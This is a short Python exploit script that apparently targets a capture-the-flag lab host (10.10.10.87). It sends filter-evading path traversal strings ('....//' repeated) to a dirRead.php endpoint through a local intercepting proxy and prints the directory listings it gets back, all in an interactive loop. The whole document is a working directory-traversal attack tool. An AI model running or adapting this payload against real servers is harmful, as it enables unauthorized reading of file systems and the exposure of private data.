import requests  
import json  
import time  
  
proxy = {  
   "http": "http://127.0.0.1:8080"      
}  
  
def readArby(file):  
  
   data = {  
       "path": file  
   }  
  
   url = "http://10.10.10.87/dirRead.php"  
  
   headers = {  
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",  
       "Accept": "*/*",  
       "Accept-Language": "en-US,en;q=0.5",  
       "Accept-Encoding": "gzip, deflate, br",  
       "Content-type": "application/x-www-form-urlencoded",  
       "Origin": "http://10.10.10.87",  
       "Referer": "http://10.10.10.87/list.html"  
  
   }  
   resp = requests.post(url, data=data, headers=headers, proxies=proxy)  
   items = resp.text.split(",")  
   return items  
  
  
if __name__ == "__main__":  
   while True:  
       file = input("Input: ")  
       file = "....//....//....//....//....//....//....//....//"+file  
       response = readArby(file)  
       print(' '.join(response))